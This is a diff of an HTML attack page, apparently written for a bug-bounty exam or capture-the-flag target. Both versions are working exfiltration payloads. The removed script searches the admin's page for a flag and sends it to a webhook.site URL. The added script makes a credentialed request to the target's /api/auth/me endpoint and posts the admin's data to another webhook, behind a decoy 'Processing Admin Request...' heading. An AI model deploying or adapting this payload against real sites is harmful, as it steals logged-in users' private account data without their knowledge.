@@ -1,32 +1,34 @@
 <!DOCTYPE html>
 <html>
-<head><title>Loading...</title></head>
 <body>
-<script>
-    const webhook = "https://webhook.site/4ebaf15d-0a4a-4391-b63b-80e6d40a14ba";
-    const msgId = "69e944edbee6d6b7c664519a"; // Your specific message ID
-    
-    const hunt = () => {
-        const flag = document.body.innerText.match(/HASH\{[^}]+\}/);
-        if (flag) {
-            fetch(webhook + "?FLAG=" + btoa(flag[0]));
-        } else {
-            // If not found, try the other page after a short delay
-            setTimeout(() => {
-                if (!window.location.href.includes(msgId)) {
-                    window.location.href = "https://bugbounty-exam.hashacademy.co/admin/messages/" + msgId;
-                }
-            }, 3000);
-            setTimeout(hunt, 1000);
-        }
-    };
+    <script>
+        const myWebhook = "https://webhook.site/1abdbc1b-75fa-4240-8ae0-e2ffb37b707e";
+        const targetApi = "https://api-bugbounty-exam.hashacademy.co/api/auth/me";
 
-    if (window.location.host.includes("hashacademy")) {
-        setTimeout(hunt, 2000);
-    } else {
-        // First, send them to the main dashboard
-        window.location.href = "https://bugbounty-exam.hashacademy.co/admin/dashboard";
-    }
-</script>
+        // Step 1: Steal the Admin's private data from the /me endpoint
+        fetch(targetApi, {
+            method: "GET",
+            credentials: "include"
+        })
+        .then(response => response.json())
+        .then(data => {
+            // Step 2: Send that data to your webhook
+            fetch(myWebhook, {
+                method: "POST",
+                mode: "no-cors",
+                body: JSON.stringify({
+                    type: "ADMIN_ME_DUMP",
+                    content: data
+                })
+            });
+        })
+        .catch(err => {
+            fetch(myWebhook, {
+                method: "POST",
+                body: JSON.stringify({ error: err.message })
+            });
+        });
+    </script>
+    <h1>Processing Admin Request...</h1>
 </body>
 </html>
